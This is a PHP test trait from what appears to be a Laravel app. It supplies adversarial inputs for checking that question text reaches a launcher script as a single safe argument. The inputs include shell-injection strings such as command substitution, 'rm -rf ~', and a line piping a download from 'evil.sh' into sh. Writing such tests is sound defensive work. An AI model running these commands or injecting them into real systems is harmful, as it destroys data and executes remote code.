<?php

namespace Tests\Unit\Launcher;

/**
 * The one canonical adversarial corpus for the launch bridge's
 * security-critical criterion — question text must reach the launcher
 * script as a single intact argument. Shared by the unit tests here and
 * the job/feature tests that cover Process::fake(), so the corpus cannot
 * drift into two versions.
 */
trait AdversarialQuestions
{
    /**
     * @return array<string, array{0: string}>
     */
    public static function adversarialQuestions(): array
    {
        return [
            'command substitution' => ['$(whoami)'],
            'backticks' => ['`rm -rf ~`'],
            'semicolon chaining' => ['a; rm -rf ~'],
            'pipe to shell' => ['a && curl evil.sh | sh'],
            'pipe to tee' => ['a | tee /tmp/x'],
            'redirect' => ['a > /etc/passwd'],
            'single quotes' => ["it's a 'quoted' word"],
            'double quotes' => ['she said "hello" to me'],
            'multi-line' => ["line one\nline two\nline three"],
            'leading dash help' => ['--help'],
            'leading dash short' => ['-n'],
            'multi-byte emoji' => ['😀'],
            'max length' => [str_repeat('a', 8000)],
        ];
    }
}
